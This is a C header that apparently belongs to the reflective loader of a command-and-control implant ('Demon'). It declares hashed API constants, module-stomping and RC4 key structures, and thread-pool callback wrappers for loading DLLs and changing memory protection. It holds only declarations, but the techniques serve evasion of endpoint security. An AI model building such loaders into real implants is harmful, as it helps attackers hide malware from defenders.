
#include <windows.h>
#include <Macro.h>
#include <ntdef.h>

#ifndef OPT
#define OPT
#endif


UINT_PTR GetRIPCallback(  );
LPVOID   KaynCaller();
VOID     KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWORD KHdrSize );

#define PAGE_SIZE                       4096
#define NTDLL_HASH                      0x70e61753
#define ADVAPI32_HASH                   0x941cbee6
#define STOMPED_HASH                    0xd2ad37e8
#define SYS_LDRLOADDLL                  0x9e456a43
#define SYS_NTALLOCATEVIRTUALMEMORY     0xf783b8ec
#define SYS_NTPROTECTEDVIRTUALMEMORY    0x50e92888
#define H_FUNC_TPALLOCWORK              0x3fc58c37
#define H_FUNC_TPRELEASEWORK            0x27a9ff4d
#define H_FUNC_TPPOSTWORK               0x4d915ab2
#define SYSTEMFUNCTION032               0xe58c8805
#define KEYSIZE 4

typedef struct {
    WORD offset :12;
    WORD type   :4;
} *PIMAGE_RELOC;

typedef struct
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} U_STRING, *PU_STRING;

typedef struct
{
    DWORD	Length;
    DWORD	MaximumLength;
    PVOID	Buffer;
} USTRING;

typedef struct
{
    struct
    {
        UINT_PTR Ntdll;
        UINT_PTR Advapi32;
    } Modules;
#ifdef _WIN64
    struct _LDRLOADDLL_ARGS {
        UINT_PTR pLdrLoadDll;   // pointer to NtAllocateVirtualMemory - rax
        SIZE_T NUmberOfArgs;
        PWSTR DllPath;                     // HANDLE searchPath = NULL - rcx
        PULONG DllCharacteristics;                      // PULONG Dllcharacetisits = 0 - rdx;
        PU_STRING DllName;                        // PVOID DllName - r8
        PVOID *DllHandle;               // PVOID *DllHandle - r9
    } LDRLOADDLL_ARGS;

    struct _NTALLOCATEVIRTUALMEMORY_ARGS{
        UINT_PTR pNtAllocateVirtualMemory;
        SIZE_T NUmberOfArgs;
        HANDLE      ProcessHandle;
        PVOID       *BaseAddress;
        ULONG_PTR   ZeroBits;
        PSIZE_T     RegionSize;
        ULONG       AllocationType;
        ULONG       Protect;
    } NTALLOCATEVIRTUALMEMORYARGS;

    struct _NTPROTECTVIRTUALMEMORY_ARGS{
        UINT_PTR pNtProtectVirtualMemory;
        SIZE_T NUmberOfArgs;
        HANDLE  ProcessHandle;
        PVOID   *BaseAddress;
        PSIZE_T RegionSize;
        ULONG   NewProtect;
        PULONG  OldProtect;
    } NTPROTECTVIRTUALMEMORY_ARGS;

#endif

    struct {
        NTSTATUS ( NTAPI *LdrLoadDll )(
                PWSTR           DllPath,
                PULONG          DllCharacteristics,
                PU_STRING       DllName,
                PVOID           *DllHandle
        );

        NTSTATUS ( WINAPI* SystemFunction032 ) ( struct ustring* data, struct ustring* key );

        NTSTATUS (NTAPI* TpAllocWork)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);

        VOID (NTAPI* TpPostWork)(PTP_WORK);

        VOID (NTAPI* TpReleaseWork)(PTP_WORK);

        NTSTATUS ( NTAPI *NtAllocateVirtualMemory ) (
                HANDLE      ProcessHandle,
                PVOID       *BaseAddress,
                ULONG_PTR   ZeroBits,
                PSIZE_T     RegionSize,
                ULONG       AllocationType,
                ULONG       Protect
        );

        NTSTATUS ( NTAPI *NtProtectVirtualMemory ) (
                HANDLE  ProcessHandle,
                PVOID   *BaseAddress,
                PSIZE_T RegionSize,
                ULONG   NewProtect,
                PULONG  OldProtect
        );

    } Win32;
#ifdef _WIN64
    struct {
        VOID (CALLBACK *WorkCallback)(
                PTP_CALLBACK_INSTANCE Instance,
                PVOID Context,
                PTP_WORK Work);
    } Callbacks;
#endif
} INSTANCE, *PINSTANCE;

#pragma pack(1)
typedef struct
{
    USTRING KeyStompedModule;
    USTRING Rc4StompedModule;
    PVOID KaynLdr;
    PVOID DllCopy;
    PVOID Demon;
    DWORD DemonSize;
    PVOID TxtBase;
    DWORD TxtSize;
} KAYN_ARGS, *PKAYN_ARGS;

BOOL SetBreakPoint(PINSTANCE pInstance);
